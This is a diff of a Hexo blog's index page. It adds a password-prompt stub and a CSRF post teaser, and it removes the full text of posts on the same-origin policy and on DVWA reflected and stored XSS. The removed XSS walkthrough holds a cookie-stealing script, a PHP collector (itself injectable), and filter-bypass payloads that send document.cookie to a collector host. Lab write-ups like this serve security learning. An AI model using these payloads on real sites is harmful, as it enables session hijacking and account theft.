@@ -16,7 +16,17 @@
 
 <html class="theme-next muse use-motion" lang="">
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
+  <script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
@@ -71,7 +81,7 @@
     scheme: 'Muse',
     version: '7.2.0',
     sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
     copycode: {"enable":false,"show_result":false,"style":null},
     fancybox: false,
     fastclick: false,
@@ -279,12 +289,172 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/08/CSRF产生原理/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cookie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/name.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The clown is laughing at you">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/08/CSRF产生原理/" class="post-title-link" itemprop="url">CSRF产生原理</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-03-08 21:59:58 / Geändert am: 21:59:30" itemprop="dateCreated datePublished" datetime="2019-03-08T21:59:58+08:00">2019-03-08</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/03/08/CSRF产生原理/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/07/同源策略/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -370,26 +540,19 @@
       
         
           
-            <p>感觉同源策略还挺难的，23333……</p>
-<h1 id="URL和URI的区别："><a href="#URL和URI的区别：" class="headerlink" title="URL和URI的区别："></a>URL和URI的区别：</h1><p>参考文章：<a href="https://www.cnblogs.com/chengdabelief/p/6635045.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengdabelief/p/6635045.html</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">理解URI和URL的区别，我们引入URN这个概念。</span><br><span class="line"></span><br><span class="line">URI = Universal Resource Identifier 统一资源标志符</span><br><span class="line"></span><br><span class="line">URL = Universal Resource Locator 统一资源定位符</span><br><span class="line"></span><br><span class="line">URN = Universal Resource Name 统一资源名称</span><br></pre></td></tr></table></figure>
-<p>三者的关系如下：<br><img src="/2019/03/07/同源策略/1.png" alt=""></p>
-<p>换句话说：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URI分为三种，URL or URN or （URL and URI）</span><br><span class="line"></span><br><span class="line">URL代表资源的路径地址，而URI代表资源的名称。</span><br></pre></td></tr></table></figure></p>
-<p>通过URL找到资源的网络位置进行标识，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.org/absolute/URI/with/absolute/path/to/resource.txt</span><br><span class="line"></span><br><span class="line">ftp://example.org/resource.txt</span><br></pre></td></tr></table></figure></p>
-<p>通过URI找到资源是通过对名称进行标识，这个名称在某命名空间中，并不代表网络地址，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urn:issn:1535-3612</span><br></pre></td></tr></table></figure></p>
-<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><h2 id="什么是同源策略？"><a href="#什么是同源策略？" class="headerlink" title="什么是同源策略？"></a>什么是同源策略？</h2><p>话说在前面，同源策略是一个模型，并非一个标准，毕竟一个标准在不同的情况下的实现可能是千变万化的。</p>
-<p>web应用的安全模型中是一个重要概念。在这个策略下，web浏览器允许第一个页面的脚本访问第二个页面里的数据，但是也只有在两个页面有相同的源时。源是由URI，主机名，端口号组合而成的。这个策略可以阻止一个页面上的恶意脚本通过页面的DOM对象获得访问另一个页面上敏感信息的权限。</p>
-<p>对于普遍依赖于cookie维护授权用户session的现代浏览器来说，这种机制有特殊意义。客户端必须在不同站点提供的内容之间维持一个严格限制，以防丢失数据机密或者完整性。</p>
-<h2 id="既为同源，何时同源？"><a href="#既为同源，何时同源？" class="headerlink" title="既为同源，何时同源？"></a>既为同源，何时同源？</h2><p>RFC6454中有定义URI源的算法定义。<strong>对于绝对的URIs，源就是{协议，主机，端口}定义的。只有这些值完全一样才认为两个资源是同源的。</strong><br><img src="/2019/03/07/同源策略/3.png" alt=""><br>只要三个元素中有一个不符合，便称为跨域。</p>
-<p>为了举例，下面的表格给出了与URL “<a href="http://www.example.com/dir/page.html&quot;" target="_blank" rel="noopener">http://www.example.com/dir/page.html&quot;</a> 的对比<br><img src="/2019/03/07/同源策略/2.png" alt=""></p>
-<p>由此可见，只要且必须满足{协议，主机，端口}一致的两个值就是同源的。</p>
-<h2 id="安全考量"><a href="#安全考量" class="headerlink" title="安全考量"></a>安全考量</h2><p>现在记住一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个策略可以阻止一个页面上的恶意脚本通过页面的DOM对象获得访问另一个页面上敏感信息的权限。</span><br><span class="line">客户端必须在不同站点提供的内容之间维持一个严格限制，以防丢失数据机密或者完整性。</span><br></pre></td></tr></table></figure></p>
-<p>然后来看一个例子，关于同源策略所能预防的问题</p>
-<p>假设用户在访问银行网站，并且没有登出。然后他又去了任意的其他网站，刚好这个网站有恶意的js代码，在后台请求银行网站的信息。因为用户目前仍然是银行站点的登陆状态，那么恶意代码就可以在银行站点做任意事情。例如，获取你的最近交易记录，创建一个新的交易等等。因为浏览器可以发送接收银行站点的session cookies，在银行站点域上。访问恶意站点的用户希望他访问的站点没有权限访问银行站点的cookie。当然确实是这样的，js不能直接获取银行站点的session cookie，但是他仍然可以向银行站点发送接收附带银行站点session cookie的请求，本质上就像一个正常用户访问银行站点一样。关于发送的新交易，甚至银行站点的CSRF（跨站请求伪造）防护都无能无力，因为脚本可以轻易的实现正常用户一样的行为。所以如果你需要session或者需要登陆时，所有网站都面临这个问题。</p>
-<p>如果未有同源策略，那么非同源的网站，也就是某些非正规的网站中的恶意代码可能对我们的银行网站进行访问，甚至进行一些操作，如果有同源策略进行防护的话，那么在同源网站和非同源网站便会存在一道墙，非同源网站的恶意代码想要进入就困难了，对于同源的站点就如有一条通道一样。</p>
-<p>简而言之：<strong>浏览器的同源策略，限制了来自不同源的”document”或脚本，对当前“document”读取或设置某些属性。</strong></p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/03/07/同源策略/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -451,7 +614,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -547,55 +710,19 @@
       
         
           
-            <p>昨天了解了一下同源策略，说实话，就懂了个皮毛，但是还蛮重要的我觉得这个模型，但是我了解到XSS之所以可行，是因为同源策略对于一下两点没有限制：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。</span><br><span class="line"><span class="number">2</span>、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的&lt;script src=<span class="string">"..."</span>&gt;&lt;/script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;等。</span><br></pre></td></tr></table></figure></p>
-<p>参考文章:<a href="https://www.freebuf.com/articles/web/157953.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/157953.html</a></p>
-<p>DVWA中的反射型XSS的靶场，我想通过这个例子来理解什么是跨站攻击脚本。</p>
-<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p>首先分析源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>可以看到这段代码中没有过滤机制，所以我们在输入框输入这么一段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"xss"</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后会弹出一个对话框，说明这里有一个XSS攻击的漏洞。我们观察页面源码，可以知道javaScript的代码在此被执行了。<br><img src="/2019/03/05/XSS-反射型/1.png" alt=""></p>
-<h2 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h2><p>用一台电脑演示，攻击A者的电脑假定IP地址为192.168.43.40，被攻击者B的电脑为192.168.43.40.<br>然后A中创建新的数据库<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> dvwacookie;</span><br><span class="line"><span class="keyword">use</span> dvwacookie;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">low</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">medium</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">high</span>(<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span> auto_increment primary <span class="keyword">key</span>,cookie <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></p>
-<p>然后在A的服务器下编写cookie.js<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.write(<span class="string">"&lt;form action='http://192.168.43.40/test/steal.php' name='exploit' method='post' style='display:none'&gt;"</span>);</span><br><span class="line">document.write(<span class="string">"&lt;input type='hidden' name='data' value='"</span>+document.cookie+<span class="string">"'&gt;"</span>);</span><br><span class="line">document.write(<span class="string">"&lt;/form&gt;"</span>);</span><br><span class="line">document.exploit.submit();</span><br></pre></td></tr></table></figure></p>
-<p>这里的document.write()方法：</p>
-<p>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。</p>
-<p>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
-<p>接着编写一段php代码,steal.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">$conn=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"dvwacookie"</span>,$conn);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"insert into low(cookie) values('"</span>.$_GET[<span class="string">'data'</span>].<span class="string">"');"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'data'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"insert into low(cookie) values('"</span>.$_POST[<span class="string">'data'</span>].<span class="string">"');"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $sql=<span class="string">"select * from low"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">while</span>($row=mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"偷取的cookie:"</span>.$row[<span class="number">1</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后构造payload为：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://192.168.43.40/test/cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p><strong>用src会加载远程服务器的js脚本，那么js的源就会变成加载它的域，从而可以读取该域的数据。</strong></p>
-<p>相当于构造链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.40/dvwa/vulnerabilities/xss_r/?name=&lt;script src=http://192.168.43.40/test/cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/03/05/XSS-反射型/2.png" alt=""><br>然后查看数据库，就能看到用户登录后的cookie.其实我这里有一个疑惑我我们获取cookie值。</p>
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p>查看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现 在这里被过滤掉了，那还是像之前那样尝试注入，看看它的过滤机制要怎么过掉。</span><br><span class="line"></span><br><span class="line">&lt;ScRiPt&gt;alert(<span class="string">"xss"</span>)&lt;/Script&gt;</span><br></pre></td></tr></table></figure>
-<p>发现可以，只是大小写被过滤掉了，然后其他的和low的一样，对steal.php稍作修改，数据表改成mediun就好了.</p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>发现添加了对大小写绕过的判断，而且根据正则表达式过滤，提交内容只要有script顺序出现的字母都一律过滤掉，只是过滤了script标签，但是有一些javascript事件后仍然能执行javascript代码.</p>
-<p>构造payload如下<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=alert("xss")&gt;</span><br></pre></td></tr></table></figure></p>
-<p>发现可行</p>
-<p>于是构造攻击用的payload<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=(location.href="http://192.168.43.40/test/steal.php?data="+document.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后这个payload自然不行<br>观察代码：(大写)，发现<strong>组成了一个script，所以被过滤掉了。</strong><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img SrC=# onerroR=(locatIon.href="httP://192.168.43.40/test/steal.php?data="+documenT.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
-<p>所以我们使用html编码来代替。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=(locat&amp;#x69;on.href="http://192.168.43.40/test/steal.php?name="+document.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
-<p>构造攻击payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.40/dvwa/vulnerabilities/xss_r/?name=&lt;img src=null onerror=(locat&amp;#x69;on.href=&quot;http://192.168.43.40/test/steal.php?data=&quot;+document.cookie)&gt;</span><br></pre></td></tr></table></figure></p>
-<h1 id="xss存储型"><a href="#xss存储型" class="headerlink" title="xss存储型"></a>xss存储型</h1><p>dvwa的靶场作为学习平台</p>
-<h1 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h1><p>观察源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input </span></span><br><span class="line">    $message = stripslashes( $message ); </span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input </span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database </span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>; </span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后个人觉得XSS漏洞会发生的地方是用户交互处，比如留言的地方，所以查看源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> name=<span class="string">"guestform"</span> <span class="string">"&gt;</span></span><br><span class="line"><span class="string">            &lt;table width="</span><span class="number">550</span><span class="string">" border="</span><span class="number">0</span><span class="string">" cellpadding="</span><span class="number">2</span><span class="string">" cellspacing="</span><span class="number">1</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">                &lt;tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;td width="</span><span class="number">100</span><span class="string">"&gt;Name *&lt;/td&gt;</span></span><br><span class="line"><span class="string">                    &lt;td&gt;&lt;input name="</span>txtName<span class="string">" type="</span>text<span class="string">" size="</span><span class="number">30</span><span class="string">" maxlength="</span><span class="number">10</span><span class="string">"&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                &lt;tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;td width="</span><span class="number">100</span><span class="string">"&gt;Message *&lt;/td&gt;</span></span><br><span class="line"><span class="string">                    &lt;td&gt;&lt;textarea name="</span>mtxMessage<span class="string">" cols="</span><span class="number">50</span><span class="string">" rows="</span><span class="number">3</span><span class="string">" maxlength="</span><span class="number">50</span><span class="string">"&gt;&lt;/textarea&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                &lt;tr&gt;</span></span><br><span class="line"><span class="string">                    &lt;td width="</span><span class="number">100</span><span class="string">"&gt;&amp;nbsp;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                    &lt;td&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="</span>btnSign<span class="string">" type="</span>submit<span class="string">" value="</span>Sign Guestbook<span class="string">" onclick="</span><span class="keyword">return</span> validateGuestbookForm(this.form);<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="</span>btnClear<span class="string">" type="</span>submit<span class="string">" value="</span>Clear Guestbook<span class="string">" onClick="</span><span class="keyword">return</span> confirmClearGuestbook();<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">                    &lt;/td&gt;</span></span><br><span class="line"><span class="string">                &lt;/tr&gt;</span></span><br><span class="line"><span class="string">            &lt;/table&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后在Message中输入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后刷新后，会有提示框中显示此处的cookie，然后查看数据库，会发现在数据库中多了我们插入的数据<br><img src="/2019/03/05/XSS-反射型/XSS-存储型/1.png" alt=""><br>实际上我在这个过程中，一直都很好奇为什么插入数据库中的数据会对此产生作用？<br>参考文章：<a href="https://www.cnblogs.com/claireyuancy/p/6808009.html" target="_blank" rel="noopener">https://www.cnblogs.com/claireyuancy/p/6808009.html</a></p>
-<p>攻击脚本被存储到了数据库或者文件里，server端（可能是别的应用或者别的页面）在读取了存储的内容后回显了，就是存储型XSS。</p>
